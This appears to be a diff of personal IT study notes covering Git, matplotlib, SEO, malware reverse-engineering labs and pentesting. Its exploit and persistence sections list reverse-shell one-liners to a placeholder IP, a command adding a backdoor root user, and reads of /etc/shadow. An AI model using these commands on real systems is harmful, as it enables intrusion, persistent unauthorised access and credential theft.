+<p>Example: Docker Runtime,... → client/server to interact with elements</p>
+<h2 id="plugins"><a class="header" href="#plugins">Plugins</a></h2>
+<ul>
+<li>network (Container Network Interface)</li>
+<li>storage (Container Storage Interface)</li>
+<li>authentication</li>
+</ul>
+<h2 id="add-ons"><a class="header" href="#add-ons">add-ons</a></h2>
+<p>DNS server (CoreDNS or kubeDNS)</p>
+<h2 id="pentest-on-kubernetes"><a class="header" href="#pentest-on-kubernetes">Pentest on Kubernetes</a></h2>
+<p><a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes Goat</a>: Interactive Kubernetes Security Learning Playground </p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="git"><a class="header" href="#git">Git</a></h1>
+<h2 id="specific-topics"><a class="header" href="#specific-topics">Specific topics</a></h2>
+<ul>
+<li><a href="it/tools/git/./git-daemon.html">Quickly share your git repository</a></li>
+</ul>
+<h2 id="basic-commands"><a class="header" href="#basic-commands">Basic commands</a></h2>
+<ul>
+<li>Cancel last local commit</li>
+</ul>
+<pre><code class="language-bash">git reset HEAD~1
+</code></pre>
+<p>-Remove a file from the index without deleting it</p>
+<pre><code class="language-bash">git reset HEAD &lt;filename&gt; # does not delete the file but removes it from the index
+</code></pre>
+<ul>
+<li>Create new branch</li>
+</ul>
+<pre><code class="language-bash">git branch &lt;branchName&gt; # locally
+# upstream branch
+git branch --set-upstream-to=origin/&lt;branchName&gt;
+git push -u origin &lt;branchName&gt;
+</code></pre>
+<ul>
+<li>Merge some commits together</li>
+</ul>
+<pre><code class="language-bash">git rebase -i HEAD~X
+# X = number of commits to merge
+# 1. make your modification
+# 2. if commits were already pushed: git push --force
+# 3. else: git push
+</code></pre>
+<ul>
+<li>Unstagged files and change active branch</li>
+</ul>
+<pre><code class="language-bash">git stash push -m &quot;message&quot;
+git stash list
+git checkout &lt;another branch&gt;
+git stash pop
+</code></pre>
+<ul>
+<li>Delete file from git history</li>
+</ul>
+<pre><code class="language-bash">git filter-branch --index-filter &quot;git rm -rf --cached --ignore-unmatch &lt;path-to-file&gt;&quot; HEAD
+git push -all --force
+</code></pre>
+<ul>
+<li>Find file in git history</li>
+</ul>
+<pre><code class="language-bash">git log --all --full-history -- &lt;path-to-file&gt;
+</code></pre>
+<ul>
+<li>Apply commits on another branch</li>
+</ul>
+<pre><code class="language-bash">git cherry-pick &lt;commit-hash&gt;
+</code></pre>
+<ul>
+<li>Add &amp; push tags</li>
+</ul>
+<pre><code class="language-bash">git tag &lt;tag-name&gt;
+git push --tags
+</code></pre>
+<ul>
+<li>Remove unwanted files that are not tracked by git.</li>
+</ul>
+<pre><code class="language-bash">git clean -fd -x
+# -x: remove ignored files too
+# -X: remove only ignored files
+# -n: for dry run
+</code></pre>
+<ul>
+<li>Use GIT with a GUI</li>
+</ul>
+<pre><code class="language-bash">gitk --all
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="quickly-share-your-git-repository"><a class="header" href="#quickly-share-your-git-repository">Quickly share your git repository</a></h1>
+<div id="admonition-warning" class="admonition admonish-warning">
+<div class="admonition-title">
+<p>Warning</p>
+<p><a class="admonition-anchor-link" href="it/tools/git/git-daemon.html#admonition-warning"></a></p>
+</div>
+<div>
+<p>This is an insecure (but very fast) way of sharing access to your git repository. Use only on a LAN where you know who can access your machine.
+For a more secure way, use SSH.</p>
+</div>
+</div>
+<h2 id="read-only-access"><a class="header" href="#read-only-access">Read-only access</a></h2>
+<p>On the machine with the repository you want to share.</p>
+<pre><code class="language-bash">git daemon --base-path=/path/where/your/repositories/are --export-all --reuseaddr --informative-errors --verbose
+
+# export-all - shares all the repositories in a folder from &quot;–base-path&quot; option
+# base-path=. - daemon looks for repositories in a current directory(&quot;.&quot;)
+# reuseaddr - allows to restart server quickly
+# informative-errors - provides cleaner error message for clients
+# verbose - notifies about each operation with the repository
+</code></pre>
+<div id="admonition-info" class="admonition admonish-info">
+<div class="admonition-title">
+<p>Info</p>
+<p><a class="admonition-anchor-link" href="it/tools/git/git-daemon.html#admonition-info"></a></p>
+</div>
+<div>
+<p>With the previous example, all git repositories are exported because of the <code>export-all</code> option.
+In order to manage which repository you want to share, simply create a <code>git-daemon-export-ok</code> empty file in the repository you want to share (and remove the former option).</p>
+</div>
+</div>
+<p>On other machines</p>
+<pre><code class="language-bash">git clone git://IP/name-of-the-repository-to-clone
+</code></pre>
+<h2 id="adding-push-access"><a class="header" href="#adding-push-access">Adding push access</a></h2>
+<p>To enable push access to your git repository, simply add <code>–enable=receive-pack</code> in your command line.</p>
+<div id="admonition-info-1" class="admonition admonish-info">
+<div class="admonition-title">
+<p>Info</p>
+<p><a class="admonition-anchor-link" href="it/tools/git/git-daemon.html#admonition-info-1"></a></p>
+</div>
+<div>
+<p>Before pushing, the client needs to create a new branch and push it to the server. Then you can merge it into the target branch.</p>
+</div>
+</div>
+<h2 id="creating-aliases"><a class="header" href="#creating-aliases">Creating aliases</a></h2>
+<p>Edit the <code>~/.gitconfig</code> file by adding the following lines</p>
+<div id="admonition-gitconfig" class="admonition admonish-tip">
+<div class="admonition-title">
+<p>~/.gitconfig</p>
+<p><a class="admonition-anchor-link" href="it/tools/git/git-daemon.html#admonition-gitconfig"></a></p>
+</div>
+<div>
+<pre><code class="language-toml">[alias]
+    serve = !git daemon --base-path=. --export-all --reuseaddr --informative-errors --verbose
+    hub = !git daemon --base-path=. --export-all --enable=receive-pack --reuseaddr --informative-errors --verbose
+</code></pre>
+</div>
+</div>
+<p>And use the newly created commands:</p>
+<pre><code class="language-bash">git serve
+# or
+git hub
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="matplotlib"><a class="header" href="#matplotlib">Matplotlib</a></h1>
+<p>Representation of <code>cos(x)</code> and <code>sin(x)</code> in <code>[-1;5]</code> with a step of <code>0.1</code>.</p>
+<pre><code class="language-python">from matplotlib import pyplot as plt
+import numpy as np
+
+x = [i for i in np.arange(-1,5.1,0.1)]
+cos = [np.cos(i) for i in x]
+sin = [np.sin(i) for i in x]
+plt.plot(x, cos)
+plt.plot(x, sin)
+plt.show()
+</code></pre>
+<p>Modify the axis terminals</p>
+<pre><code class="language-python">plt.axis((Xmin, Xmax, Ymin, Ymax))
+# or
+plt.xlim(min,max)
+plt.ylim(min,max)
+</code></pre>
+<p>Change labels</p>
+<pre><code class="language-python">plt.xticks(position, labels, rotation, horizontal_alignment) # x-axis
+plt.yticks(position, labels, rotation, vertical_alignment) # y-axes
+</code></pre>
+<p>Adapt the size of the image according to the content</p>
+<pre><code class="language-python">plt.tight_layout()
+</code></pre>
+<p>Change Titles</p>
+<pre><code class="language-python">plt.title() # graphic
+plt.x_label() # x-axes
+plt.y_label() # y-axes
+</code></pre>
+<p>Everything that is text can be changed</p>
+<pre><code class="language-python">color
+fontname
+fontsize # size in points
+fontweight # bold/normal
+style # normal/italic/oblique
+Latex # '$...$'
+</code></pre>
+<p>Draw a curve</p>
+<pre><code class="language-python">plot([x-axis...], [ordonnees...])
+# optional parameters, if None, then [0, 1, 2, ...]
+</code></pre>
+<p>Display legends. Must be called after all calls to <code>plot()</code></p>
+<pre><code class="language-python">plt.legend()
+</code></pre>
+<p>Interactive mode (no need to call <code>show()</code>). Display a curve, do other tasks, question the user and update the curve.</p>
+<p>Some <code>plot()</code> parameters</p>
+<pre><code class="language-python">color
+linestyle (solid, dashed, dashdot, ...)
+linewidth
+marker
+markersize
+</code></pre>
+<p>Change the title of the window (default: 'Figure 1')</p>
+<pre><code class="language-python">plt.gcf().canvas_manager.set_windows.title(&quot;New title&quot;)
+</code></pre>
+<p>Some examples on <a href="https://matplotlib.org/stable/gallery/index.html">Matplotlib</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="natural-referencing"><a class="header" href="#natural-referencing">Natural Referencing</a></h1>
+<h2 id="the-domain-name"><a class="header" href="#the-domain-name">The domain name</a></h2>
+<ul>
+<li>avoid <code>-</code> which are considered as penalizing</li>
+<li>it's better without offensive words and easy to spell</li>
+<li>the size of the domain name must be about 9 words</li>
+<li>register your domain name for 1 year or less is characterized as suspicious</li>
+<li>a valid SSL certificate is better</li>
+</ul>
+<h2 id="page-construction"><a class="header" href="#page-construction">Page construction</a></h2>
+<ul>
+<li>you need keywords related to your site</li>
+<li>the content of the pages must be relevant and organized</li>
+<li>if the speed of loading the page is long ( Ex: images too heavy) your site will be less well referenced</li>
+<li>it is preferable to have a qualitative code</li>
+<li>feature snippets: this is a portion of text that directly answers a question asked in the search engine. Indeed, it is an extract that leads the user to click on the page to get the full content. Try the site <a href="it/technics/natural-referencing/answerthepublic.com">Answer The Public</a> to know what people are looking for on Google (could be interested to look for your keywords).</li>
+</ul>
+<h2 id="backlinks"><a class="header" href="#backlinks">Backlinks</a></h2>
+<p>Links that lead to your website. For Google, if a site has many backlinks, it is a popular and quality site. It also takes into account the age of the domain name that makes the incoming link. Indeed, there is a difference between Wikipedia and a site that is a few months old.</p>
+<p>It takes into account the link that redirects to your site.</p>
+<ul>
+<li>the complete site (https://your-own-site.com), the complete site is considered of quality</li>
+<li>a specific page of your site (https://your-own-site.com/a/very/specific/page/somewhere/in/your/site), there is only one interesting content.</li>
+</ul>
+<h2 id="user-loyalty"><a class="header" href="#user-loyalty">User loyalty</a></h2>
+<ul>
+<li>The more time they spend on the site, the better.</li>
+<li>Encourage users to comment on content. Many comments involve a topic of interest, so users will return to the site to see the responses (⚠️ to moderation).</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="web-scrapping"><a class="header" href="#web-scrapping">Web Scrapping</a></h1>
+<h2 id="frameworks"><a class="header" href="#frameworks">Frameworks</a></h2>
+<ul>
+<li>BeautifulSoup</li>
+<li>MechanicalSoup</li>
+<li>Scrapy</li>
+<li>Photon → collection of URLs, files, specific data (emails, social networks)</li>
+<li>Puppeteer</li>
+</ul>
+<h3 id="puppeteer"><a class="header" href="#puppeteer">Puppeteer</a></h3>
+<p>Allows to drive a chromium instance (works with nodejs).</p>
+<ul>
+<li>automate tasks (forms, data monitoring)</li>
+<li>browse web pages (tests, scrapping)</li>
+<li>make screenshots or export web pages to PDF</li>
+<li>capture a chronological trace of a site to diagnose performance problems</li>
+<li>test chrome extensions</li>
+<li>possibility to display the window to follow the navigation</li>
+<li>dev chrome tools → <code>Recorder</code> allows to record a navigation and extract the puppeteer code.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
+<h2 id="static-analysis"><a class="header" href="#static-analysis">Static analysis</a></h2>
+<h3 id="how-to-know-if-a-binary-is-packed"><a class="header" href="#how-to-know-if-a-binary-is-packed">How to know if a binary is packed</a></h3>
+<ul>
+<li><em>PEid</em>
+<ul>
+<li>Raw Size and Virtual Size are very different</li>
+<li>Character strings are random.</li>
+<li>Non-standard section names (UPX0, ...)</li>
+</ul>
+</li>
+<li><em>Dependency viewer</em>
+<ul>
+<li>Low number of imports</li>
+</ul>
+</li>
+</ul>
+<h3 id="extract-resource-section-from-a-binary"><a class="header" href="#extract-resource-section-from-a-binary">Extract resource section from a binary</a></h3>
+<ul>
+<li><em>Resource Hacker</em>
+<ul>
+<li>if a binary contains resources (section <strong>.rsrc</strong>), it's possible to view/extract it with this software).</li>
+</ul>
+</li>
+</ul>
+<h3 id="upx"><a class="header" href="#upx">UPX</a></h3>
+<p><em>UPX</em>, is a tool called packer, used to pack/unpack a binary.</p>
+<h2 id="dynamic-analysis"><a class="header" href="#dynamic-analysis">Dynamic analysis</a></h2>
+<ul>
+<li><em>procmon</em> - monitor the actions performed on the system when malware is launched</li>
+<li><em>process explorer</em> - obtain information on the process in memory (there may be differences between the binary on disk and what runs in memory - (strings present, DLLs loaded, etc.))</li>
+<li><em>inetsim</em> - simulate network responses to allow malware to continue executing normally (if in multiple VMs, change <code>DNS IP</code> and <code>bind_address</code> to listen on all interfaces, not just local)</li>
+<li><em>wireshark</em> - capture network traffic</li>
+<li><em>regshot</em> - capture windows registry before and after malware execution</li>
+</ul>
+<p>If you need to analyze a DLL, you can execute with <strong>cmd.exe</strong> using the following command:</p>
+<pre><code class="language-cmd">rundll32.exe &lt;dll_path&gt;, &lt;exported_func&gt;
+</code></pre>
+<div class="warning">
+    Malware may want to delete itself. This can fail if other software has a <b>handle</b> on it. For example, during static analysis, a <b>handle</b> can be kept on the malware and removal fails.
+</div>
+<h2 id="a-few-tips-on-using-ida"><a class="header" href="#a-few-tips-on-using-ida">A few tips on using IDA</a></h2>
+<ul>
+<li>
+<p>to identify a local variable for a function, IDA specifies negative addresses (relative to <strong>esp</strong>) - otherwise it's an argument.</p>
+<p><img src="it/technics/reverse-engineering/img%5Cida-var-vs-args.png" alt="local variable vs arguments" /></p>
+</li>
+</ul>
+<h3 id="some-shortcuts"><a class="header" href="#some-shortcuts">Some shortcuts</a></h3>
+<ul>
+<li>
+<p>Rename what you understand, variables, functions... (keyboard shortcut: <strong><code>n</code></strong>)</p>
+</li>
+<li>
+<p>Add comments (keyboard shortcut: <strong><code>:</code></strong>)</p>
+</li>
+<li>
+<p>jump to a specific line (keyboard shortcut: <strong><code>g</code></strong>)</p>
+</li>
+<li>
+<p>display <em>cross</em>-references (X-ref) (keyboard shortcut: <strong><code>x</code></strong>)</p>
+</li>
+</ul>
+<h3 id="how-to-read"><a class="header" href="#how-to-read">How to read</a></h3>
+<pre><code class="language-assembly">mov dest, src
+xor edx, edx ; sets edx to 0
+</code></pre>
+<h4 id="arguments-are-pushed-on-the-stack-from-right-to-left"><a class="header" href="#arguments-are-pushed-on-the-stack-from-right-to-left">Arguments are pushed on the stack, from right to left.</a></h4>
+<p>From the windows documentation <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket">socket windows documentation</a></p>
+<pre><code class="language-c++">SOCKET WSAAPI socket(
+  [in] int af,
+  [in] int type,
+  [in] int protocol
+);
+</code></pre>
+<p><img src="it/technics/reverse-engineering/img/Lab05-call-to-socket.png" alt="arguments order on the stack" /></p>
+<p>In this <code>socket</code> call, <code>protocol=6</code>, <code>type=1</code> and <code>af=2</code>.</p>
+<h2 id="quick-binary-analysis"><a class="header" href="#quick-binary-analysis">Quick binary analysis</a></h2>
+<p>In the <strong>functions</strong> tab, we search for the <strong>_main</strong> function, which is the entry point for our program.</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-main-entry-point.png" alt="main entry point" /></p>
+<p>We finally realize that our binary contains a simple <code>if</code> displaying whether it has access to the Internet or not.</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-a-simple-if.png" alt="a simple if" /></p>
+<blockquote>
+<p>The <code>printf</code> function is not recognized by IDA, but you can tell it's this function by a quick scan. A call to <code>_stbuf</code> and <code>_ftbuf</code> is made.</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-printf.png" alt="printf" /></p>
+</blockquote>
+<p>The <code>InternetReadFile</code> function takes a buffer and buffer size as parameters. Here, we push 512 bytes (200h). Except that at declaration time, we notice that the <code>Buffer</code> variable (IDA didn't notice it was an array, so it just says it's a pointer) isn't 512 bytes (difference between <code>Buffer</code> and <code>var_20c</code>).</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-buffer-size.png" alt="Buffer size" /></p>
+<p>To modify this interpretation of IDA, move to the Buffer declaration, then <code>ctrl+k</code>.</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-ida-stack-resizing.png" alt="ida stack resizing" /></p>
+<p>After modification:</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-ida-stack-after-modification.png" alt="ida stack resizing after modification" /></p>
+<p>After the <code>InternetReadFile</code> function, the program checks the beginning of the response and look for a specific command so that it knows what to do next.</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-parse-html-page.png" alt="parse html page" /></p>
+<p>Valid commands are <code>[a, b, c, d, e]</code></p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-check-command-validity.png" alt="check command validity" /></p>
+<h3 id="dynamically-testing-commands"><a class="header" href="#dynamically-testing-commands">Dynamically testing commands</a></h3>
+<p>Appending a comment in the inetsim fake html page. (The <strong>a</strong> command should create a directory)</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-inetsim-html-page.png" alt="inetsim html page" /></p>
+<p>Executing the malware</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-malware-execution.png" alt="malware execution" /></p>
+<p>The new Temp directory is then created</p>
+<p><img src="it/technics/reverse-engineering/img/Lab06-execution-result.png" alt="execution result" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="example-of-a-complete-analysis"><a class="header" href="#example-of-a-complete-analysis">Example of a complete analysis</a></h1>
+<h2 id="static-analysis-1"><a class="header" href="#static-analysis-1">Static analysis</a></h2>
+<h3 id="loading-the-file-into-peid"><a class="header" href="#loading-the-file-into-peid">Loading the file into PEID</a></h3>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-PEid-1.png" alt="Loading the file into PEID" /></p>
+<h3 id="list-of-sections"><a class="header" href="#list-of-sections">List of sections</a></h3>
+<p>Here we can see that there are resources inside the binary.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-PEid-section.png" alt="List of sections" /></p>
+<h3 id="strings-in-the-binary"><a class="header" href="#strings-in-the-binary">Strings in the binary</a></h3>
+<p>The <code>svchost.exe</code> string in a binary is not usual.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-PEid-strings.png" alt="Strings in the binary" /></p>
+<h3 id="extracting-resources"><a class="header" href="#extracting-resources">Extracting resources</a></h3>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-resource-hacker.png" alt="Extracting resources" /></p>
+<p>Note that the extracted resource contains a lot of <code>0x41</code>. Perhaps a xor is performed to hide the resources.</p>
+<h3 id="dependencywalker-imports"><a class="header" href="#dependencywalker-imports">DependencyWalker Imports</a></h3>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-dependency-walker.png" alt="DependencyWalker Imports" /></p>
+<h2 id="dynamic-analysis-1"><a class="header" href="#dynamic-analysis-1">Dynamic analysis</a></h2>
+<h3 id="procmon-in-capture"><a class="header" href="#procmon-in-capture">Procmon in capture</a></h3>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-procmon-before-capture.png" alt="procmon before capture" /></p>
+<h3 id="regshot-12"><a class="header" href="#regshot-12">Regshot 1/2</a></h3>
+<p>Before launching the binary, you need to do a first shot with RegShot to get a fingerprint of the Windows registry and see which ones have been modified.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-regshot-1st-shot.png" alt="regshot 1st shot" /></p>
+<h3 id="regshot-22"><a class="header" href="#regshot-22">Regshot 2/2</a></h3>
+<p>Here we have all registry that have been modified or added during the process execution.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-regshot-comparison.png" alt="Regshot comparison" /></p>
+<h3 id="process-explorer"><a class="header" href="#process-explorer">Process explorer</a></h3>
+<p>On the process explorer capture, we can see that after we started the malware, a new process called <code>svchost.exe</code> was also started.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-svchost-created-by-malware.png" alt="process explorer" /></p>
+<h3 id="comparing-strings"><a class="header" href="#comparing-strings">Comparing strings</a></h3>
+<p>When comparing strings present in the binary and strings present in memory, we can see that they are not the same.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-procexplo-strings-comparison-image.png" alt="Strings in the binary" /></p>
+<p>Strings in memory look like keyboard keys. There is also a log file name. Could it be a keylogger?</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-procexplo-strings-comparison-memory.png" alt="Strings in memory" /></p>
+<h3 id="execution"><a class="header" href="#execution">Execution</a></h3>
+<p>During the execution, we can see that the <code>svchost.exe</code> process is created and that nothing is going through the network (the wireshark window stays empty).</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-execution.gif" alt="malware execution" /></p>
+<p>While our <strong>infected</strong> <code>svchost.exe</code> continues to run, let's relaunch <strong>procmon</strong> and filter on the <strong>infected</strong> PID. And let's write to a notepad. We can see some operations such as <code>CreateFile</code>, <code>WriteFile</code>, <code>CloseFile</code>...</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-procmon-keylogger.gif" alt="procmon keylogger" /></p>
+<p>You can find the path where the registered keyboard keys are located.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-procmon-writefile-path.png" alt="log file path" /></p>
+<p>Content of the created log file.</p>
+<p><img src="it/technics/reverse-engineering/complete-analysis-example/img/Lab03-03-content-of-the-logfile.png" alt="log file content" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="penetration-testing---pentest"><a class="header" href="#penetration-testing---pentest">Penetration testing - Pentest</a></h1>
+<h2 id="introduction-to-penetration-testing"><a class="header" href="#introduction-to-penetration-testing">Introduction to penetration testing</a></h2>
+<p>Definitions:</p>
+<ul>
+<li><strong>Risk assessment</strong>: Analysis of services to identify vulnerabilities in systems, applications or processes.</li>
+<li><strong>Penetration testing</strong>: Check if the vulnerabilities found are really present or not (false positives).</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="recognition"><a class="header" href="#recognition">Recognition</a></h1>
+<h2 id="active-research"><a class="header" href="#active-research">Active research</a></h2>
+<pre><code class="language-bash">host [domain_name] # get IPv4 IPv6
+</code></pre>
+<pre><code class="language-bash">whois [domain_name] # allows you to retrieve information about the dns servers used (available ip server, owner name, address)
+</code></pre>
+<pre><code class="language-bash">dig [domain_name] # retrieve DNS addresses. Other information can be retrieved with the -h
+</code></pre>
+<pre><code class="language-bash">dnsenum [domain_name] # retrieve DNS records and Nx server
+</code></pre>
+<pre><code class="language-bash">theharvester -d [domain_name] # recovery of emails, host names
+</code></pre>
+<pre><code class="language-bash">fping/ping # check the presence of a machine on the network
+fping -g [network] # gives all the addresses of the network that are reachable
+</code></pre>
+<h3 id="load-balancing-detection"><a class="header" href="#load-balancing-detection">Load Balancing Detection</a></h3>
+<p>Load balancing detection is needed to eliminate inconsistency in results. It is very essential to determine the range of IP addresses which should be included in the scope of the test.</p>
+<p>When dealing with servers with load balancing, the results of regular tests may vary due to the load balancer in work. Sometimes we may get different IP addresses when we ping the host at different times during a test. This is because a DNS-load balancer might be in place.</p>
+<p>A set of techniques for distributing a workload among different computers in a group. These techniques make it possible to respond to an excessive load of a service by distributing it over several servers, and to reduce the potential unavailability of this service that could result from the software or hardware failure of a single server.</p>
+<p><a href="https://kalilinuxtutorials.com/lbd/">lbd</a>
+<code>lbd [domain-name] [port,]</code> will check if a domain uses load balancing.</p>
+<h2 id="passive-research"><a class="header" href="#passive-research">Passive research</a></h2>
+<h3 id="whois"><a class="header" href="#whois">whois</a></h3>
+<ul>
+<li>Look for information on a site (available ip server, owner name, address,...). You have to protect your site when you create it (in the params so as not to be visible in the public databases).</li>
+<li>Allows to get information about the DNS servers used</li>
+</ul>
+<h3 id="online-tools"><a class="header" href="#online-tools">Online Tools</a></h3>
+<ul>
+<li><a href="https://www.exploit-db.com">Exploit DB</a>: simplified google searches, usable sites.</li>
+<li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">Company Search</a>: information about a US company</li>
+<li><a href="http://web.archive.org">Web Archive</a>: know the old versions of the sites (when the updates took place...)</li>
+<li><a href="https://www.shodan.io/">Shodan.io</a>: search for objects connected to the Internet with a visible IP address (server, camera, printers...)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="scanning"><a class="header" href="#scanning">Scanning</a></h1>
+<h2 id="machine-enumeration"><a class="header" href="#machine-enumeration">Machine enumeration</a></h2>
+<pre><code class="language-bash">fping/ping # check for the presence of a machine on the network
+fping -g [local network] # give all the local network addresses that are reachable
+for i in {1..254}; do ping-c 1 -w 1 X.X.X.$i |grep from; done
+</code></pre>
+<p><strong>nmap</strong>: open source port scanner (graphical → zenmap)</p>
+<pre><code class="language-bash">nmap -sV -p- [ip] # scan a machine
+nmap @network/mask # scan a network
+
+-p 80,443,8080 # check specific ports
+-F # fast scanning (fewer ports scanned)
+--exclude @IP # exclude an IP to scan
+-sP # IP to know if the network address or hosts are up or down (MAC address is given if up)
+ -sV # service version detection
+ -O  # operating system detection
+ -v  # verbose or -vv
+ -A  # aggressive scan (OS, script, traceroute) open ports, services, version --&gt; when you don't care how 'loud' you are
+
+ -Pn # if I don't want to ping the host
+
+ --script vuln # if I want to run all scripts out of the vulnerability category
+# all categories: https://nmap.org/book/nse-usage.html
+
+# Timing template. (increase the speed your scan runs at) - /!\ higher speeds are noisier, and can incur errors!
+ -T5
+
+#### Ping sweep ####
+-sn [networkIp]/[mask] # to obtain a map of the network structure.
+
+#### SAVE THE OUTPUT ####
+ -oA # three major formats
+ -oN # normal format
+ -oG # Grepable format
+ -oX # output in xml format
+
+xsltproc filename.xml -o filename.html # You can open an easy-to-read summary in the browser.
+
+# Gets help on all http scripts
+--script-help &quot;http-*&quot;
+</code></pre>
+<pre><code class="language-bash">rustscan -a [ip] -- [nmap_arguments]
+</code></pre>
+<pre><code class="language-bash">nessus # reports potential weaknesses on the tested machines (to be downloaded from tenable)
+/etc/init.d/nessusd start # start nessus
+http://localhost:8834 # access to nessus + register on tenable for an activation code
+</code></pre>
+<h2 id="website-scanner"><a class="header" href="#website-scanner">Website Scanner</a></h2>
+<pre><code class="language-bash">nikto -h [url]
+wapiti
+</code></pre>
+<pre><code class="language-bash">gobuster vhost -w [subdomains_list] -u [url] # look for subdomains
+feroxbuster -w [wordlist_path] -x php,html,txt -u [url] # look for hidden files or directories
+dirbuster
+wfuzz -z file,[wordlist_path] -d &quot;[param]=FUZZ&amp;[param]=FUZZ&quot; --hc 302 [url] # Fuzz parameters
+</code></pre>
+<h3 id="urlgit"><a class="header" href="#urlgit">URL/.git/</a></h3>
+<pre><code class="language-bash">wget --mirror -I .git [url]/.git/
+git checkout -- # if some files have been deleted, get them back
+git log
+git checkout [LOG-ID] # go back to a previous commit
+
+git log --all --full-history
+git show [COMMIT-ID]
+git log --stat
+</code></pre>
+<p>Some automated scripts to investigate deeply.
++ <strong><a href="https://gist.github.com/Bilou4/fe23f8a0eb368ca20247f87fc4dd4500">script export.sh</a></strong>: Use this script to get all the history of a given file.
++ <strong><a href="https://github.com/arthaud/git-dumper">git-dumper</a></strong>: tool to dump a git repository from a website.
++ <strong><a href="https://github.com/internetwache/GitTools">git-tools</a></strong>: A repository with 3 tools for pwn'ing websites with .git repositories available.
++ <strong><a href="https://github.com/captain-noob/GitHacker">githacker</a></strong>: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="exploit-gaining-access"><a class="header" href="#exploit-gaining-access">Exploit (Gaining Access)</a></h1>
+<h2 id="definitions"><a class="header" href="#definitions">Definitions</a></h2>
+<p><strong>horizontal elevation</strong> = get the privileges of a user in the same circle of use</p>
+<p><strong>vertical elevation</strong> = get the most advanced privileges (root/administrator)</p>
+<h2 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h2>
+<h3 id="shell-upgrading"><a class="header" href="#shell-upgrading">Shell upgrading</a></h3>
+<pre><code class="language-bash">/usr/bin/script -qc /bin/bash /dev/null # works almost all the time
+
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' # only if python is installed
+</code></pre>
+<h3 id="shell-stabilization"><a class="header" href="#shell-stabilization">Shell Stabilization</a></h3>
+<pre><code class="language-bash">export TERM=xterm # this will give us access to term commands such as clear
+Ctrl + Z # background the shell
+stty raw -echo; fg # This does two things: 1. it turns off our own terminal echo (which gives us access to tab autocompletion, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+</code></pre>
+<h3 id="write-multiple-lines-in-a-file-with-echo"><a class="header" href="#write-multiple-lines-in-a-file-with-echo">Write multiple lines in a file with <code>echo</code></a></h3>
+<pre><code class="language-bash">echo &quot;line 1
+line 2&quot; &gt;&gt; file.txt
+</code></pre>
+<h3 id="bash-reverse-shell-one-line"><a class="header" href="#bash-reverse-shell-one-line">BASH reverse shell one line</a></h3>
+<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [ip] 4444 &gt;/tmp/f
+
+bash -c &quot;bash -i &gt;&amp; /dev/tcp/[ip]/4444 0&gt;&amp;1&quot; # possibility not to use 'bash -c' at the beginning
+
+nc [IP] [PORT]
+
+php -r '$sock=fsockopen(&quot;[IP]&quot;,[port]);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="persistence-maintaining-access---privilege-escalation"><a class="header" href="#persistence-maintaining-access---privilege-escalation">Persistence (Maintaining Access) - Privilege Escalation</a></h1>
+<p>After the elevation of privileges phase, comes the establishment of a constant access to the target (backdoor, persistence module...).</p>
+<pre><code class="language-bash">echo &quot;root2:`openssl passwd toor`:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd # to create another root user
+</code></pre>
+<h2 id="user-information-gathering"><a class="header" href="#user-information-gathering">User information gathering</a></h2>
+<p>Once we have a shell on the victim, we can get a lot of information about the target with the following commands</p>
+<h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
+<pre><code class="language-bash"># DNS configuration
+cat /etc/resolv.conf
+# configuration file containing details about user accounts
+cat /etc/passwd
+# stores the hashed passphrase for Linux user account
+cat /etc/shadow
+</code></pre>
